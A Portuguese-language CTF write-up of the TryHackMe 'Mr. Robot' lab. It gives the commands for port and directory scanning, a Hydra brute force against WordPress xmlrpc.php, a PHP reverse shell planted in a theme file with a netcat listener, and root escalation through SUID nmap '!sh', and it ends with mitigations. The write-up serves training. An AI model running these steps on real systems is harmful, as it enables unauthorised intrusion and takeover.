# 📄 RELATÓRIO TÉCNICO – CTF MR. ROBOT (TryHackMe)

👤 **Autor:** c0rt3s
🎯 **Plataforma:** TryHackMe
🖥️ **Máquina:** Mr. Robot
📌 **Tipo:** CTF – Web / Linux / Privilege Escalation
⚙️ **Objetivo:** Obter as 3 flags da máquina
📊 **Nível de dificuldade:** Médio
🧠 **Base de estudo:** Conteúdo e metodologia do curso da Desec Security

---

# 🎯 Objetivo do Lab

O objetivo deste laboratório foi comprometer a máquina *Mr. Robot* da plataforma TryHackMe e obter as três flags solicitadas, aplicando técnicas de reconhecimento, enumeração web, força bruta, exploração de WordPress, obtenção de shell reversa e escalonamento de privilégios em ambiente Linux.

A máquina foi escolhida como forma de validar, na prática, os conhecimentos adquiridos durante os estudos na Desec Security.

---

# ⚔️ Resumo da Cadeia de Ataque

A exploração da máquina seguiu o seguinte fluxo:

```
Reconhecimento de portas
        ↓
Enumeração de diretórios
        ↓
Descoberta do robots.txt
        ↓
Download da wordlist fsocity.dic
        ↓
Enumeração de usuários WordPress
        ↓
Brute force de senha
        ↓
Acesso ao painel WordPress
        ↓
Upload de reverse shell
        ↓
Acesso como www-data
        ↓
Quebra de hash MD5
        ↓
Acesso como robot
        ↓
Enumeração de SUID
        ↓
Exploração do Nmap SUID
        ↓
Acesso root
        ↓
Captura das flags
```

Essa sequência representa uma **kill chain clássica de exploração em aplicações web rodando em servidores Linux**.

---

# 🔍 Reconhecimento Inicial – Enumeração de Portas

Como em todo CTF, o primeiro passo foi identificar os serviços expostos pelo alvo utilizando **Nmap**.

```
nmap -v -sS -sV 10.64.166.14
```

O scan identificou as seguintes portas abertas:

* 22 (SSH)
* 80 (HTTP)
* 443 (HTTPS)

A presença da porta 80 indicava um serviço web ativo, que passou a ser o foco inicial da exploração.

---

# 🌐 Enumeração Web – Gobuster

Ao acessar o serviço HTTP pelo navegador, foi encontrado um site temático da série Mr. Robot.

Foi então iniciada a enumeração de diretórios utilizando **Gobuster**:

```
gobuster dir -u http://10.64.166.14 -w /home/c0rt3s/SecLists/Discovery/Web-Content/common.txt -a "Mozilla 5.1"
```

Durante a enumeração dois pontos chamaram atenção:

* arquivo `robots.txt`
* diretório `wp-admin`

A presença do diretório `wp-admin` indicava que o site utilizava **WordPress**.

---

# 🤖 Análise do robots.txt

Ao acessar o arquivo `robots.txt`, foram encontradas duas informações importantes:

* a **primeira flag** (`key-1-of-3.txt`)
* um arquivo chamado `fsocity.dic`

Esse arquivo foi baixado com o comando:

```
wget http://10.64.166.14/fsocity.dic
```

Após análise, foi identificado que se tratava de uma **wordlist**, sugerindo que seria utilizada em ataques de força bruta contra o WordPress.

---

# 🔐 Ataque de Força Bruta – WordPress

Inicialmente foi realizada enumeração de usuários utilizando **WPScan**.

```
wpscan --url http://10.64.166.14/wp-login.php fsocity.dic --username fsocity.dic
```

Após um período de execução foi identificado o usuário válido:

**Usuário:** elliot

Em seguida foi realizado brute force da senha utilizando **Hydra**.

```
hydra -V -t 8 -l elliot -P fsocity_clean.dic 10.64.166.14 http-post-form \
"/xmlrpc.php:<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>elliot</string></value></param><param><value><string>^PASS^</string></value></param></params></methodCall>:faultCode"
```

Após algum tempo foi descoberta a senha:

Senha: **ER28-0652**

Com isso foi possível acessar o painel administrativo do WordPress.

---

# ⚠️ Observação – Enumeração Alternativa

Após finalizar o laboratório foi identificado que a enumeração do usuário WordPress poderia ser realizada de forma mais rápida utilizando **Burp Suite**, analisando as respostas da aplicação durante tentativas de login.

Essa abordagem permite identificar usuários válidos observando diferenças nas respostas HTTP retornadas pelo servidor.

---

# 🧨 Exploração – Reverse Shell via WordPress

Após obter acesso ao painel administrativo do WordPress foi utilizado o **Editor de Aparência** para modificar arquivos do tema.

Foi inserido um **reverse shell em PHP** baseado no script do PentestMonkey no arquivo:

```
archive.php
```

Na máquina atacante foi iniciado um listener utilizando Netcat:

```
nc -lvnp 1337
```

Ao acessar o arquivo `archive.php` pelo navegador, o script foi executado e iniciou uma conexão reversa com a máquina atacante.

Isso concedeu acesso remoto ao servidor.

---

# 🐚 Acesso Inicial ao Sistema

Após obter a shell reversa foi identificado que o acesso inicial ocorreu como usuário do serviço web.

Durante a enumeração foi acessado o diretório:

```
/home/robot
```

Dentro dele foram encontrados dois arquivos:

* `key-2-of-3.txt`
* `password.raw-md5`

Entretanto o arquivo da flag não possuía permissão de leitura.

O arquivo `password.raw-md5` continha um hash MD5 referente à senha do usuário **robot**.

Após realizar a quebra do hash foi possível executar:

```
su robot
```

Obtendo assim acesso ao usuário **robot** e à **segunda flag**.

---

# 🔎 Enumeração de Privilégios – Binários SUID

Para buscar possíveis vetores de escalonamento de privilégio foi realizada enumeração de binários SUID.

```
find / -perm -4000 -type f 2>/dev/null
```

Durante a análise foi identificado um binário crítico:

```
/usr/local/bin/nmap
```

Esse binário possuía o **bit SUID ativo**, o que significa que ele poderia ser executado com privilégios do proprietário do arquivo.

---

# 🚀 Escalonamento de Privilégio – Nmap SUID

Foi executado o Nmap em modo interativo:

```
/usr/local/bin/nmap --interactive
```

Dentro do modo interativo foi executado:

```
!sh
```

Devido ao bit SUID, o shell foi iniciado com privilégios de **root**.

---

# 🔓 Acesso Root e Flag Final

Com acesso root foi possível acessar o diretório do administrador do sistema:

```
/root
```

Dentro dele foi localizada a **terceira e última flag**:

```
key-3-of-3.txt
```

Com isso a máquina foi comprometida com sucesso.

---

# 💥 Impacto de Segurança

Caso essas vulnerabilidades estivessem presentes em um ambiente real, um atacante poderia:

* obter informações sensíveis através de arquivos expostos
* comprometer o painel administrativo do CMS
* executar código remoto no servidor
* escalar privilégios até root
* obter controle total do sistema

Isso poderia resultar em **comprometimento completo da infraestrutura do servidor**.

---

# 🛡️ Mitigações Recomendadas

Algumas medidas que poderiam prevenir essa exploração incluem:

* restringir acesso a arquivos sensíveis como `robots.txt`
* implementar proteção contra brute force em WordPress
* desabilitar o editor de temas no painel administrativo
* monitorar execução de binários com permissão SUID
* aplicar princípio de menor privilégio em binários críticos

---

# 🧠 Conclusão

Este laboratório demonstrou claramente a importância de uma metodologia sólida de pentest. A máquina Mr. Robot apresentou diversas falhas clássicas:

* Vazamento de informações via `robots.txt`
* WordPress vulnerável a ataques de força bruta
* Execução de código via edição de temas
* Binário SUID mal configurado permitindo escalonamento de privilégio

A conclusão bem-sucedida deste CTF reforça que os estudos realizados na Desec Security estão trazendo resultados práticos e consistentes, consolidando tanto a parte teórica quanto a prática em ambientes reais de exploração.

---
